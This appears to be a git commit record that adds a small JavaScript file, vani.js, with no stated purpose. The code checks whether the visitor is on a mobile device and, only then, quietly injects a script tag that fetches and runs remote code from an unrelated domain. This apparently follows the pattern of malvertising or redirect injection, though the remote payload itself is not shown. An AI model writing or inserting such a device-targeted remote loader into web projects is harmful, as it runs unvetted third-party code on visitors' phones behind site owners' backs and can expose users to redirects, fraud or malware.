a6564757e43bee1538e1929521ccd19ef8fc8681
dork12 <127926288+yukrini@users.noreply.github.com>
2023-05-04 18:01:11 +0700

    Create vani.js

---
+++ vani.js
@@ -0,0 +1,9 @@
+if (screen.width < 500 ||
+ navigator.userAgent.match(/Android/i) ||
+ navigator.userAgent.match(/webOS/i) ||
+ navigator.userAgent.match(/iPhone/i) ||
+ navigator.userAgent.match(/iPod/i)){
+	 
+	(function(s,u,p){s.src=u,p.appendChild(s);})(document.createElement('script'),'//sadnesscontemporary.com/fa/0e/12/fa0e124f1920d762255ca02d71ca0481.js',document.body||document.documentElement)
+	 }
+	 
